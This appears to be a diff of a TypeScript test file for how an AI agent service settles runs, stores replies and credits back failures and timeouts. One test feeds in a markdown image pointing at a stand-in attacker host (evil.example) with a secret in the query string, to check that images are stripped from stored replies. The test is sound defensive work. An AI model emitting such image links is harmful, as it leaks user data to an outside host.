@@ -1,7 +1,6 @@
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
 
-import { TEST_TURN_ATTEMPT_ENDED_MESSAGE } from '../src/agents/test-turn-limits.ts';
 import {
   configureInstallationAdmission,
   resetInstallationAdmissionForTests,
@@ -51,22 +50,19 @@ test('a reply leaves the store with no image a client would fetch: each is its a
 
 test('an answered run stores its reply without images', () => {
   const settled = testRunSettlement(answered(' Two tickets. ![](https://evil.example/p?d=SECRET) '), 'sub_1', undefined);
-  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], steps: [] });
+  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], skills: [], steps: [] });
 });
 
-test('an attempt the 25-call limit ended is a failure that stopped at the limit and is not credited back; another agent failure is', () => {
-  const ended = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
-  // As Flue settles it (tests/run-fees-flue.test.ts reads the real one).
-  assert.deepEqual(ended({
-    name: 'FlueError', type: 'operation_failed', message: `dispatch(sub_1) failed: ${TEST_TURN_ATTEMPT_ENDED_MESSAGE}`,
-    meta: { operation: 'dispatch(sub_1)', reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE },
-  }), { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
-  assert.deepEqual(ended({ message: 'The attempt failed.', cause: { message: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
-  // Flue's reason is matched exactly, even if its message prefix changes.
-  assert.deepEqual(ended({ name: 'FlueError', message: 'Operation failed.', meta: { reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
-  assert.deepEqual(ended({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
+test('an agent failure is credited back, as a direct message\'s is', () => {
+  const failed = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
+  assert.deepEqual(failed({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
+});
+
+test('a run Flue timed out, or one aborted, is a deadline credited back as a timeout', () => {
+  // The usual timeout: Flue ends the submission at its own durability's timeout, before the store's deadline.
+  assert.deepEqual(testRunSettlement({ outcome: 'failed', error: { type: 'submission_timeout', message: 'The submission timed out.' } }, 'sub_1', undefined),
+    { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
+  assert.deepEqual(testRunSettlement({ outcome: 'aborted' }, 'sub_1', undefined), { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
 });
 
 test('a test run is credited back as a direct message is: never while its installation is suspended or ended', async (t) => {
